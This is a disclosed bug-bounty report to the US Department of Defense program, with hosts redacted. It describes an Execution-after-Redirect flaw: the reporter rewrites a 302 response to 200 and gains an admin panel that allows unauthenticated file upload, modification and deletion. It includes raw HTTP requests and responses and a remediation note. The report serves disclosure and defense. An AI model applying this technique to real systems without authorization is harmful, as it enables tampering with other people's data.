# Unauthenticated Access to Admin Panel Functions at https://██████████/████████

## Report Details
- **Report ID**: 1394910
- **URL**: https://hackerone.com/reports/1394910
- **State**: Closed
- **Severity**: critical
- **Submitted**: 2021-11-08T21:24:16.560Z
- **Disclosed**: 2021-11-29T22:11:25.600Z

## Reporter
- **Username**: palaziv
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: deptofdefense

## Vulnerability Information
**Description:**
I discovered that the admin panel at https://████/█████ and all its functions can be accessed without authentication.

## Impact

An attacker is able to use the administrative functions in order to upload, delete or modify files.

## System Host(s)
████████

## Affected Product(s) and Version(s)
██████'s ████████ (███) Management

## CVE Numbers


## Steps to Reproduce
* Navigate to https://█████/ and click on the "█████████" button
* Notice how the application first sends an HTTP POST request to https://█████████/█████ which gets answered with a redirect to https://█████/█████ which again redirects to https://███████/█████████
* Looking at the response to https://█████████/███████ I noticed that even though the server sent back a 302 status code with a header `Location: /█████` the response was quite long
* I browsed to https://████████/████, intercepted the response in Burp, changed the status code from `302 Found` to `200 OK` and was presented with the admin panel (this kind of attack is called [Execution after Redirect](https://owasp.org/www-community/attacks/Execution_After_Redirect_(EAR))). Below you can see the unmodified response containing links to the ███ Admin Functions:

```
HTTP/1.1 302 Found
Date: Mon, 08 Nov 2021 20:28:44 GMT
Content-Type: text/html; charset=UTF-8
Connection: close
Cache-Control: no-store, no-cache, must-revalidate
Expires: Thu, 19 Nov 1981 08:52:00 GMT
Location: /███████
Pragma: no-cache
X-Vcap-Request-Id: f4014a06-51c2-44c3-4e4f-6db613c30484
Strict-Transport-Security: max-age=31536000; includeSubDomains
Content-Length: 4260


<table align="center" width="800" border="1" cellspacing="1"
	cellpadding="1" bgcolor="#008000">
	<tr>
		<td style="color: #FFF" ;="" align="center">LIMITED DISTRIBUTION<br> <font
			size="2px">Distribution authorized to DoD, IAW 10 U.S.C. &#167&#167
				130 &amp; 455. Release authorized to U.S. DoD contractors, IAW 48
				C.F.R. &#167 252.245-7000. <br>Refer other requests to:
				Headquarters, █████████, ATTN: Release Officer, █████████
				████████. <br>Destroy IAW DoDD 5030.59.
				Removal of this caveat is prohibited.
		</font></td>
	</tr>
</table>
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html lang='en' xmlns="http://www.w3.org/1999/xhtml">
<head>
<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
<title>Admin</title>
<script src="../███████p/SpryAssets/SpryMenuBar.js" type="text/javascript"></script>
<link href="../█████████p/SpryAssets/SpryMenuBarHorizontal.css"
	rel="stylesheet" type="text/css" />
</head>

<body>
	<table align="center" bgcolor="#82F379" border="3">
		<tr>
			<td colspan="2" align="center"><img
				src="../██████p/images/███_banner_top.jpg" /></td>
		</tr>
		<tr>
			<td align="center"><br />
            ████ You are on NIPR NET RESTRICTIVE<br /></td>
		</tr>
		<tr>
			<td>
				<div align="center">
					<ul id="MenuBar1" class="MenuBarHorizontal">
						<li><a class="MenuBarItemSubmenu" href="#">Home</a></li>
						<li><a class="MenuBarItemSubmenu" href="#">███████ Admin Functions</a>
							<ul>
								<li><a href="s3html.php">UpLoad Weekly</a></li>
								<li><a href="../████p/████████/verifyfile.php">Verify File Dates</a></li>
								<li><a href="#">Add Single File</a>
									<ul>
										<li><a href="../████p/███/addnewfile.php" target="new">VDU ADD
										</a></li>
										<li><a href="../████p/████████/addvpf.php" target="new">VPF ADD</a></li>
										<li><a href="../███████p/████████/████████class.php" target="new">Change
												Classification</a></li>
										<li><a href="../██████████p/██████/███████████████">New █████</a></li>
										<li><a href="../████p/████/██████loadgraph.php" target="new">Graphic
												ADD</a></li>
										<li><a href="../███p/██████/████delgrp.php">Delete 'ALL' Graphic
												Files</a></li>
									</ul></li>
								<li><a href="#">Upload New Editions</a>
									<ul>
										<li><a href="../███p/█████/██████████loadvdu.php" target="new">Install
												New Base VDU </a></li>
										<li><a href="../█████p/█████/████████loadvpf.php" target="new">Install
												New base VPF </a></li>
										<li><a href="../█████████p/███/█████████loadtxt.php" target="new">Install/Update
												██████##.txt</a></li>
										<li><a href="../█████p/██████████/████newgraph.php" target="new">Replace
												all Graphic Files</a></li>
									</ul></li>
								<li><a href="#">Modify Single File**</a>
									<ul>
										<li><a href="../████████p/█████████/███mod.php">Modify ██████ Chart</a></li>
										<li><a href="../████p/██████████/██████████vitem.php">Modify Library Specific
												File</a></li>
										<li><a href="../███p/██████████/█████viteml.php">Stop ALL VPFS from
												being viewed from specific Region</a></li>
										<li><a href="../███p/██████/██████████graphic.php">Modify Graphic
												Specific File</a></li>
									</ul></li>
								<li><a href="../█████████p/████/██████████vpfdel.php">DELETE VPF, VDU,
										Graphics</a></li>
								<li><a href="#">Change Status of Deleted and New Records</a>
									<ul>
										<li><a href="../██████████p/███/█████deldel.php">Change Record Status
												To an ADDed or DELeted VDU Record</a></li>
									</ul></li>
								<li><a href="../█████████p/█████/████████_documentation.php">██████████
										Documentation</a></li>
							</ul></li>
						<li><a href="dssLogout.php">Logout</a></li>
					</ul>
				</div>
				<p>&nbsp;</p>
				<p>&nbsp;</p>
				<p>
					<br /> <br />
				</p>
			</td>
		</tr>
		<tr>
			<td><br /> <br /></td>
		</tr>
		<tr align="center">
		</tr>
	</table>
	<script type="text/javascript">
    var MenuBar1 = new Spry.Widget.MenuBar("MenuBar1", {imgDown:"../SpryAssets/SpryMenuBarDownHover.gif", imgRight:"../SpryAssets/SpryMenuBarRightHover.gif"});
</script>
</body>
</html>

```

* The functions allow to upload, modify and to delete ████ files and can all be used completely unauthenticated. Following an example in which I upload a file; this upload function can be accessed from https://███/elist/s3html.php. Note that the request has no session cookie:

```
POST /██████████ HTTP/1.1
Host: ███
Content-Length: 899
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
Origin: https://█████
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryT4r0MDX8IcQqr8D9
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.54 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Referer: https://██████████/elist/s3html.php
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Connection: close

------WebKitFormBoundaryT4r0MDX8IcQqr8D9
Content-Disposition: form-data; name="nNtM"

13/37
------WebKitFormBoundaryT4r0MDX8IcQqr8D9
Content-Disposition: form-data; name="oNtM"

13/37
------WebKitFormBoundaryT4r0MDX8IcQqr8D9
Content-Disposition: form-data; name="update"

2021-11-08
------WebKitFormBoundaryT4r0MDX8IcQqr8D9
Content-Disposition: form-data; name="nxtdate"

2021-12-06
------WebKitFormBoundaryT4r0MDX8IcQqr8D9
Content-Disposition: form-data; name="regionSelect"

01
------WebKitFormBoundaryT4r0MDX8IcQqr8D9
Content-Disposition: form-data; name="type"

windows
------WebKitFormBoundaryT4r0MDX8IcQqr8D9
Content-Disposition: form-data; name="userfile1[]"; filename="test.txt"
Content-Type: text/plain

test

------WebKitFormBoundaryT4r0MDX8IcQqr8D9
Content-Disposition: form-data; name="buttonm"

Begin Uploads
------WebKitFormBoundaryT4r0MDX8IcQqr8D9--

```

Response:

```
HTTP/1.1 302 Found
Date: Mon, 08 Nov 2021 21:03:35 GMT
Content-Type: text/html; charset=UTF-8
Connection: close
Cache-Control: no-store, no-cache, must-revalidate
Expires: Thu, 19 Nov 1981 08:52:00 GMT
Location: 404.html
Pragma: no-cache
Set-Cookie: JSESSIONID=0g33q2a5b6hkj02pv9hro94dqa; path=/; HttpOnly
Set-Cookie: __VCAP_ID__=7aa1d3ae-4d04-4a15-6476-fac8; Path=/; HttpOnly; Secure
X-Vcap-Request-Id: c7bd3c85-075f-43d3-4a45-7f494a6cc748
Strict-Transport-Security: max-age=31536000; includeSubDomains
Set-Cookie: TS01485890=01d8bb34a4a839126a96d80bd04820274929fd7bd07f6a640cdcbc306946f3965158fe2cdee1ce628fee6943b7320cf7b62b158749; Path=/
Content-Length: 337

<br> path is /███████<br> get outtest.txt<br>S3 keyname: ██████████p/█████████test.txt<br>i = 0, Upload SUCCESS!<br>S3 ObjectURL: https://███████/████p/███████████████test.txt<br>error in ██████charts table 
```

## Suggested Mitigation/Remediation Actions
Implement proper access controls.

Mitigation for the Execution after Redirect vulnerability: Proper termination should be performed after redirects. In a function a return should be performed. In other instances functions such as die() should be performed. This will tell the application to terminate regardless of if the page is redirected or not.



## Attachments
No attachments
